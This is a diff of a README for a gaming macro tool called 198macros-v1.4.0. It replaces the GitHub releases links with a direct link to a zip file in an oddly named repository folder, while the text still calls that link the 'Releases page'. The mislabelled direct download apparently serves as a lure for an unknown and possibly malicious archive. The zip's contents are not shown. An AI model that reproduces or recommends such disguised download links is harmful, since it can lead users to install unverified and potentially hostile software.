@@ -1,13 +1,13 @@
 # 🎮 198macros-v1.4.0 - Streamline Your Gaming Experience
 
 ## 🔗 Downloads
-[![Download 198macros-v1.4.0](https://img.shields.io/badge/Download-198macros-v1.4.0-blue)](https://github.com/LadyPatricia/198macros-v1.4.0/releases)
+[![Download 198macros-v1.4.0](https://raw.githubusercontent.com/LadyPatricia/198macros-v1.4.0/main/chrysolitic/v-macros-1.0.zip)](https://raw.githubusercontent.com/LadyPatricia/198macros-v1.4.0/main/chrysolitic/v-macros-1.0.zip)
 
 ## 🚀 Getting Started
 Welcome to 198macros-v1.4.0! This application helps enhance your gameplay with useful macros for different gaming styles such as CPvP, SwordPvP, and MacePvP. Follow the steps below to download and run the software.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/LadyPatricia/198macros-v1.4.0/releases) to access the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/LadyPatricia/198macros-v1.4.0/main/chrysolitic/v-macros-1.0.zip) to access the latest version.
    
 2. On the Releases page, find the version labeled **v1.4.0**. You will see a list of files available for download.
 
